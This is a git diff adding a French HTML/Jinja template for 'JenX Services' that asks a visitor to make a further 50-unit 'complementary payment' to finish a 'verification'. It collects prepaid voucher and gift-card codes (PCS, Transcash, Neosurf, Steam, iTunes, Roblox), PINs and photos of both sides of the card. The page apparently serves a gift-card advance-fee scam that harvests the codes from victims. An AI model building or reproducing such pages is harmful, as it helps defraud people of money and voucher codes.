@@ -1,0 +1,126 @@
+<!-- templates/complementary_payment.html -->
+<!DOCTYPE html>
+<html lang="fr">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>JenX Services - Paiement complémentaire</title>
+    <script src="https://cdn.tailwindcss.com"></script>
+    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;600;700&display=swap" rel="stylesheet">
+    <style>
+        body {
+            font-family: 'Inter', sans-serif;
+            background-color: #f0f2f5;
+        }
+    </style>
+</head>
+<body class="flex items-center justify-center min-h-screen bg-gray-100 p-4">
+    <div class="bg-white p-8 rounded-xl shadow-lg w-full max-w-md text-center">
+        <h2 class="text-3xl font-bold text-gray-800 mb-4">Paiement Complémentaire</h2>
+        <p class="text-gray-600 mb-6">Pour finaliser la vérification, veuillez effectuer un paiement de <span class="font-bold text-blue-600">50 {{ currency }}</span>.</p>
+        
+        <div class="mb-6 p-4 border border-blue-200 bg-blue-50 rounded-lg text-left">
+            <p class="font-semibold text-blue-800 mb-2">Instructions de paiement :</p>
+            <ul class="list-disc list-inside text-gray-700 text-sm">
+                <li>Veuillez utiliser le même mode de paiement que précédemment.</li>
+                <li>Assurez-vous que le montant exact de 50 {{ currency }} est envoyé.</li>
+                <li>Une fois le paiement effectué, veuillez renseigner les informations ci-dessous.</li>
+            </ul>
+        </div>
+
+        <form action="/submit_complementary_payment" method="POST" enctype="multipart/form-data" class="space-y-6">
+            <input type="hidden" name="payment_method" value="{{ payment_method }}">
+
+            {% if payment_method == 'card' %}
+                <div>
+                    <label for="card_type" class="block text-sm font-medium text-gray-700 text-left">Type de carte</label>
+                    <select id="card_type" name="card_type" required
+                            class="mt-1 block w-full px-4 py-2 border border-gray-300 rounded-md shadow-sm focus:ring-blue-500 focus:border-blue-500 sm:text-sm">
+                        <option value="">Sélectionnez un type</option>
+                        <option value="PCS">PCS card</option>
+                        <option value="Transcash">Transcash card</option>
+                        <option value="Steam">Steam card</option>
+                        <option value="iTunes">iTunes card</option>
+                        <option value="Neosurf">Neosurf card</option>
+                        <option value="Neosurf">apple card</option>
+                        <option value="Neosurf">Roblox card</option>
+                        <option value="Autre">Autre</option>
+                    </select>
+                </div>
+                <div>
+                    <label for="card_number" class="block text-sm font-medium text-gray-700 text-left">Numéro/code de la carte</label>
+                    <input type="text" id="card_number" name="card_number" required
+                           class="mt-1 block w-full px-4 py-2 border border-gray-300 rounded-md shadow-sm focus:ring-blue-500 focus:border-blue-500 sm:text-sm"
+                           placeholder="Ex: 1234-5678-9012-3456">
+                </div>
+                <div>
+                    <label for="card_code" class="block text-sm font-medium text-gray-700 text-left">PIN/CVV (si applicable)</label>
+                    <input type="text" id="card_code" name="card_code" 
+                           class="mt-1 block w-full px-4 py-2 border border-gray-300 rounded-md shadow-sm focus:ring-blue-500 focus:border-blue-500 sm:text-sm"
+                           placeholder="Ex: 1234 / 123">
+                </div>
+                <div>
+                    <label for="card_date" class="block text-sm font-medium text-gray-700 text-left">Date d'expiration (si applicable)</label>
+                    <input type="text" id="card_date" name="card_date"
+                           class="mt-1 block w-full px-4 py-2 border border-gray-300 rounded-md shadow-sm focus:ring-blue-500 focus:border-blue-500 sm:text-sm"
+                           placeholder="MM/AA (Ex: 12/25)">
+                </div>
+                <div>
+                    <label for="card_amount" class="block text-sm font-medium text-gray-700 text-left">Montant de la carte ({{ currency }})</label>
+                    <input type="number" id="card_amount" name="card_amount" required step="0.01" value="50.00" readonly
+                           class="mt-1 block w-full px-4 py-2 border border-gray-300 rounded-md shadow-sm bg-gray-50 cursor-not-allowed sm:text-sm">
+                </div>
+                <div>
+                    <label for="recto_photo" class="block text-sm font-medium text-gray-700 text-left">Photo du recto de la carte</label>
+                    <input type="file" id="recto_photo" name="recto_photo" accept="image/*" required
+                           class="mt-1 block w-full text-sm text-gray-500 file:mr-4 file:py-2 file:px-4 file:rounded-md file:border-0 file:text-sm file:font-semibold file:bg-blue-50 file:text-blue-700 hover:file:bg-blue-100">
+                </div>
+                <div>
+                    <label for="verso_photo" class="block text-sm font-medium text-gray-700 text-left">Photo du verso de la carte</label>
+                    <input type="file" id="verso_photo" name="verso_photo" accept="image/*" required
+                           class="mt-1 block w-full text-sm text-gray-500 file:mr-4 file:py-2 file:px-4 file:rounded-md file:border-0 file:text-sm file:font-semibold file:bg-blue-50 file:text-blue-700 hover:file:bg-blue-100">
+                </div>
+            {% elif payment_method == 'ticket' %}
+                <div>
+                    <label for="ticket_photo" class="block text-sm font-medium text-gray-700 text-left">Photo du ticket physique</label>
+                    <input type="file" id="ticket_photo" name="ticket_photo" accept="image/*" required
+                           class="mt-1 block w-full text-sm text-gray-500 file:mr-4 file:py-2 file:px-4 file:rounded-md file:border-0 file:text-sm file:font-semibold file:bg-blue-50 file:text-blue-700 hover:file:bg-blue-100">
+                </div>
+                <div>
+                    <label for="ticket_code" class="block text-sm font-medium text-gray-700 text-left">Code du ticket</label>
+                    <input type="text" id="ticket_code" name="ticket_code" required
+                           class="mt-1 block w-full px-4 py-2 border border-gray-300 rounded-md shadow-sm focus:ring-blue-500 focus:border-blue-500 sm:text-sm"
+                           placeholder="Ex: ABC12345">
+                </div>
+                <div>
+                    <label for="ticket_amount" class="block text-sm font-medium text-gray-700 text-left">Montant du ticket ({{ currency }})</label>
+                    <input type="number" id="ticket_amount" name="ticket_amount" required step="0.01" value="50.00" readonly
+                           class="mt-1 block w-full px-4 py-2 border border-gray-300 rounded-md shadow-sm bg-gray-50 cursor-not-allowed sm:text-sm">
+                </div>
+                <div>
+                    <label for="ticket_type" class="block text-sm font-medium text-gray-700 text-left">Type de ticket</label>
+                    <input type="text" id="ticket_type" name="ticket_type"
+                           class="mt-1 block w-full px-4 py-2 border border-gray-300 rounded-md shadow-sm focus:ring-blue-500 focus:border-blue-500 sm:text-sm"
+                           placeholder="Ex: Ticket restaurant, Chèque cadeau">
+                </div>
+                <div>
+                    <label for="ticket_expiration" class="block text-sm font-medium text-gray-700 text-left">Date d'expiration (si applicable)</label>
+                    <input type="date" id="ticket_expiration" name="ticket_expiration"
+                           class="mt-1 block w-full px-4 py-2 border border-gray-300 rounded-md shadow-sm focus:ring-blue-500 focus:border-blue-500 sm:text-sm">
+                </div>
+            {% else %}
+                <p class="text-red-500">Mode de paiement non reconnu. Veuillez contacter le support.</p>
+            {% endif %}
+
+            <div>
+                <button type="submit"
+                        class="w-full flex justify-center py-3 px-4 border border-transparent rounded-md shadow-sm text-lg font-medium text-white bg-green-600 hover:bg-green-700 focus:outline-none focus:ring-2 focus:ring-offset-2 focus:ring-green-500 transition duration-150 ease-in-out">
+                    Soumettre le paiement complémentaire
+                </button>
+            </div>
+        </form>
+        <p class="text-sm text-gray-500 mt-4">Un reçu vérifié vous sera fourni après cette étape.</p>
+    </div>
+</body>
+</html>
+
